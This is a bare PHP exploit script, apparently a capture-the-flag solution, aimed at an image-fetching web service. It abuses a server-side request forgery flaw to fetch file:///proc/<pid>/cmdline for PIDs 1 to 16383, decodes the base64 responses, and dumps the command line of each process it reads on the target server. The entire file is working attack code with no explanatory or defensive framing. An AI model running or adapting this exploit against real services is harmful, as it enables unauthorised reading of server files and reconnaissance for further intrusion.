<?php
    function ssrf($url) {
        $query = array(
            "url" => $url
        );
        $query_str = http_build_query($query);
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, "http://base64image.splitline.tw:8894/?page=result");
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $query_str);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
        $result = curl_exec($curl);
        if (preg_match('&<img src="data:image/jpeg;base64,(.*)"><hr>&', $result, $match) !== 1) {
            return NULL;
        }
        $value = $match[1];
        return base64_decode($value);
        
    }
    for ($pid = 1; $pid < 16384; $pid++) {
        $result = ssrf("file:///proc/$pid/cmdline");
        if ($result !== NULL) {
            var_dump($pid, $result);
        }
    }
